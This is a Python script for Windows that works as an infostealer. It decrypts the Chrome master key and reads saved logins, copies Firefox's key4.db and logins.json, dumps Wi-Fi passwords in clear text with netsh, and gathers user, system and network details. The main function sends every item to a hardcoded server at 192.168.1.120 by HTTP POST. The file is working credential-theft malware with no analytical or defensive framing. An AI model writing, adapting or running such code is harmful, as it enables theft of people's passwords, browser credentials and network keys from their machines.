import requests 
import subprocess
import re
import sqlite3
import win32crypt 
import shutil
import os
import json
import base64
def general_info():
    command = "whoami && path && net users && systeminfo"
    result = subprocess.check_output(command,shell=True)
    return result
def sendtoserver(data):
        url = 'http://192.168.1.120/'
        requests.post(url, data)
def get_username():
    get_username_command = subprocess.check_output('echo %username%',shell=True)
    username = get_username_command.decode()
    return username.splitlines()[0]            
def dumpchromebrowser():
    with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State', "r", encoding='utf-8') as f:
        local_state = f.read()
        local_state = json.loads(local_state)
    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]  #  DPAPI
    master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
    dbpath = "C:\\Users\\{0}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data".format(get_username())
    dbpath2 = "C:\\Users\\{0}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login0".format(get_username())
    shutil.copyfile(dbpath,dbpath2)
    dbconn = sqlite3.connect("C:\\Users\\{0}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login0".format(get_username()))
    cursor = dbconn.cursor()
    all = cursor.execute('SELECT * FROM logins')
    result = str(all.fetchone()) + "\nMaster key for chrome -->" + str(master_key)
    return result            
def dumpfirefoxbrowser():
    command = "dir C:\\Users\\%username%\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\"
    execommand = subprocess.Popen(command, shell = True,stdout=subprocess.PIPE)
    folder_data = execommand.stdout.read()
    foler_finder = re.findall("\w*.default-release",folder_data.decode("utf-8"))
    logins_path = "C:\\Users\\{1}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\{0}\\logins.json".format(foler_finder[0],get_username())
    key4_path = "C:\\Users\\{1}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\{0}\\key4.db".format(foler_finder[0],get_username())
    with open(key4_path,"rb") as f:
        enkey4 = base64.b64encode(f.read())
        sendtoserver(enkey4)
    with open(logins_path,"rb") as f:
        enlogins = base64.b64encode(f.read())    
        sendtoserver(enlogins)
    
    
def network_info():
    ip = requests.get('https://api.ipify.org/?format=post')
    netinfo = subprocess.check_output('ipconfig',shell = True)
    netstat = subprocess.check_output('netstat -ano',shell = True)
    result = str(ip.content) + netinfo.decode('utf-8') + netstat.decode('utf-8')
    return result    
    
def wifi_info():
    command = "netsh wlan show profile * key=clear"
    result = subprocess.check_output(command, shell = True)
    return result      
    
def main():
    dumpfirefoxbrowser()
    sendtoserver(wifi_info())
    sendtoserver(network_info())
    sendtoserver(dumpchromebrowser())
    sendtoserver(general_info())
if __name__ == '__main__':    
    main()    